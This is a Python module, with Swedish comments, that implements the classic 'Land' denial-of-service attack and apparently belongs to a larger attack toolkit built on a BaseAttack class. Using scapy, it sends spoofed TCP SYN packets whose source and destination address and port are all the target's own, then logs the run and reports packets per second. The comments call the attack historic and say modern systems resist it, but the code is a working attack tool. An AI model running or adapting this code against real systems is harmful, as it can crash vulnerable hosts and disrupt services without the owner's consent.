"""
Land Attack - Klassisk DoS från 90-talet
Skickar paket där source och destination är samma
"""
from scapy.all import IP, TCP, Raw
import time
import random
from .base_attack import BaseAttack


class LandAttack(BaseAttack):
    """Land Attack - Source och destination IP/port är samma"""

    def get_attack_name(self):
        return "Land Attack"

    def execute(self, count=100, target_port=80):
        """Kör Land attack"""
        self.print_header("Land Attack (Same Source/Dest)", port=target_port, count=count)

        print("[*] Land Attack - Klassisk attack från 1997")
        print("[*] Skickar paket där source = destination")
        print("[*] Kan orsaka infinite loop på äldre system")

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            payload = f"{self.custom_message}_LAND_PKT_{i + 1}".encode()

            # Source och destination är SAMMA!
            packet = IP(src=self.target_ip, dst=self.target_ip) / \
                     TCP(sport=target_port, dport=target_port,
                         flags="S",
                         seq=random.randint(1000, 9000)) / \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] Land: {i + 1}/{count} paket skickade ({pps:.1f} pps)")
                print(f"    → {self.target_ip}:{target_port} → {self.target_ip}:{target_port}")

        self.log_attack("LAND_ATTACK",
                        f"Port {target_port}, {count} packets, message: {self.custom_message}")
        self.print_summary()

        print("\n[!] Moderna system är skyddade, men äldre kan krascha")
        print("[!] Historiskt intressant attack")

